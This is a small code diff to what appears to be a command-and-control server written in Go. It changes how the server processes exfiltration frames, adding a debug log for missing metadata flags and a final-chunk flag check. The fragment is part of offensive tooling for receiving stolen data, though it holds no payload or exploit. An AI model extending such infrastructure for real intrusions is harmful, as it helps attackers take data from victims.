@@ -675,6 +675,11 @@ func (c2 *C2Manager) ProcessExfilFrame(frame *ExfilFrame, clientIP string) (bool
 			return false, fmt.Errorf("chunk frame missing payload")
 		}
 		if frame.Counter == 0 {
+			if frame.Flags&FrameEnvelopeFlagMetadata == 0 {
+				if c2.debug {
+					logf("[Exfil] metadata chunk missing metadata flag")
+				}
+			}
 			return c2.handleExfilMetadataFrame(frame, clientIP)
 		}
 		return c2.handleExfilDataFrame(frame, clientIP)
@@ -744,6 +749,9 @@ func (c2 *C2Manager) handleExfilDataFrame(frame *ExfilFrame, clientIP string) (b
 		meta.TotalChunks = frame.Counter
 	}
 	if meta.TotalChunks != 0 && frame.Counter == meta.TotalChunks {
+		meta.Flags |= ExfilFlagFinalChunk
+	}
+	if frame.Flags&FrameEnvelopeFlagFinal != 0 {
 		meta.Flags |= ExfilFlagFinalChunk
 	}
 
